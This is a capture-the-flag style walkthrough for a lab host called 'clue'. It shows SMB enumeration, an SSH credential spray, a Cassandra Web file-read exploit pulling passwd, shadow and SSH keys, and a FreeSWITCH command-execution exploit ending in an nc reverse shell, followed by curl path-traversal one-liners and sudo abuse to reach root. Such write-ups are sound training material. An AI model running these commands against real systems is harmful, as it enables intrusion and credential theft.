## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.142.240
# HOSTNAME
clue
# OPERATING SYSTEM
Debian GNU/Linux 10 (buster)
# CREDENTIALS  
cassie:SecondBiteTheApple330               // Found after initial foothold

```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38

3000/tcp open  http             syn-ack ttl 61 Thin httpd

139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)

8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
```
# ENUMERATION
```bash
# SMB
139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
- enumerate shares
sudo netexec smb $ip --shares -u '' -p ''
SMB         192.168.142.240 445    CLUE             [*] Unix - Samba (name:CLUE) (domain:pg) (signing:False) (SMBv1:True)
SMB         192.168.142.240 445    CLUE             [+] pg\: 
SMB         192.168.142.240 445    CLUE             [*] Enumerated shares
SMB         192.168.142.240 445    CLUE             Share           Permissions     Remark
SMB         192.168.142.240 445    CLUE             -----           -----------     ------
SMB         192.168.142.240 445    CLUE             print$                          Printer Drivers
SMB         192.168.142.240 445    CLUE             backup          READ            Backup web directory shares
SMB         192.168.142.240 445    CLUE             IPC$                            IPC Service (Samba 4.9.5-Debian)

- using smbclient access the share //$ip/backup
sudo smbclient  //$ip/backup
smb: \> ls 
  .                                   D        0  Fri Aug  5 14:13:50 2022
  ..                                  D        0  Fri Aug  5 14:13:44 2022
  freeswitch                          D        0  Fri Aug  5 14:13:51 2022
  cassandra                           D        0  Fri May  6 20:34:47 2022

- Found share //$ip/backup
- freeswitch, cassandra directory with config file
- Download all files from share
smb: \> prompt off
smb: \> recurse on
smb: \> mget *


sudo netexec ssh $ip -u usernames -p usernames

SSH         192.168.142.240 22     192.168.142.240  [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         192.168.142.240 22     192.168.142.240  [-] root:root
SSH         192.168.142.240 22     192.168.142.240  [-] cassie:root
SSH         192.168.142.240 22     192.168.142.240  [-] anthony:root
SSH         192.168.142.240 22     192.168.142.240  [-] root:cassie
SSH         192.168.142.240 22     192.168.142.240  [-] cassie:cassie
SSH         192.168.142.240 22     192.168.142.240  [-] anthony:cassie
SSH         192.168.142.240 22     192.168.142.240  [-] root:anthony
SSH         192.168.142.240 22     192.168.142.240  [-] cassie:anthony
SSH         192.168.142.240 22     192.168.142.240  [-] anthony:anthony



# Port 80
80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
- Forbidden

# Port 3000
http://192.168.142.240:3000/
- Cassandra Web

searchsploit cassandra 
Cassandra Web 0.5.0 - Remote File Read | linux/webapps/49362.py

- Read file using exploit
python3 49362.py -p 3000 $ip /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash

- Found users
root
cassie
anthony

python3 49362.py -p 3000 $ip /home/cassie/.ssh/id_rsa
Failed to read /home/cassie/.ssh/id_rsa (bad path?)

python3 49362.py -p 3000 $ip /home/anthony/.ssh/id_rsa
Failed to read /home/anthony/.ssh/id_rsa (bad path?)


# Port 8021 - freeswitch
8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
- Exploit
FreeSWITCH 1.10.1 - Command Execution | windows/remote/47799.txt
python3 ./47799.txt $ip id
Authentication failed

- uses default password "ClueCon"
- From the downloaded files from share //$ip/backups search for files containing string "ClueCon"
grep -iR ClueCon ./
- Found files
./freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml:    <param name="password" value="ClueCon"/>
```
## INITIAL FOOTHOLD
```bash
- Try to read the file using exploit 49362.py
python3 49362.py -p 3000 $ip /etc/freeswitch/autoload_configs/event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>

- Found password "StrongClueConEight021"
- Using this password on the exploit 47799.txt
python3 ./47799.txt $ip id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)

# proper shell
sudo nc -nvlp 80
python3 ./47799.txt $ip 'nc -e /bin/bash 192.168.45.212 80'
```
## PRIVILEGE ESCALATION
```bash
# Cassie creds
ps -ef
cassie     930     1  0 13:20 ?        00:00:01 /usr/bin/ruby2.5 /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330

# Credentials
cassie:SecondBiteTheApple330

freeswitch@clue:/$ su cassie
Password: 
cassie@clue:/$ sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
cassie@clue:/$ 

# Found id_rsa under /home/cassie/
- Copy the private key and try login
sudo ssh -i id_rsa root@$ip  
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~# id
uid=0(root) gid=0(root) groups=0(root)
root@clue:~# whoami
root

# root
```
# More Privesc
## Method II
```bash
sudo -l
(ALL) NOPASSWD: /usr/local/bin/cassandra-web

# Start cassandra-web as root
sudo cassandra-web -B 0.0.0.0:7777 -u cassie -p SecondBiteTheApple330
- Now cassandra-web runs on port 7777
- But accessible only internally 
- can port forward or move the exploit 49362.py to /tmp on 192.168.203.240 Machine and run exploit to view sensitive files as root

# PrivEsc
python3 49362.py 127.0.0.1 -p 7777 /etc/shadow
python3 49362.py 127.0.0.1 -p 7777 /home/anthony/.ssh/id_rsa

# Use the private key and login 
- anothony unable to login with private key
- able to use the private key as root 

sudo ssh -i anthony.key root@$ip
# root
```
## Method III
```bash
# using curl
curl http://192.168.120.155:3000/../../../../../../../../etc/passwd --path-as-is
curl http://192.168.120.155:3000/../../../../../../../../proc/self/cmdline --path-as-is
curl http://192.168.120.155:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml --path-as-is

sudo cassandra-web -B 0.0.0.0:7777 -u cassie -p SecondBiteTheApple330
curl localhost:7777/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is
```
# ENUMERATION OUTPUTS
## NMAP
```bash
PORT     STATE SERVICE          REASON         VERSION
22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+

80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)

139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)

3000/tcp open  http             syn-ack ttl 61 Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
| http-methods: 
|_  Supported Methods: GET HEAD

8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m14s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-11-17T13:24:54-05:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46210/tcp): CLEAN (Timeout)
|   Check 2 (port 41318/tcp): CLEAN (Timeout)
|   Check 3 (port 24538/udp): CLEAN (Timeout)
|   Check 4 (port 49325/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-11-17T18:24:55
|_  start_date: N/A

```

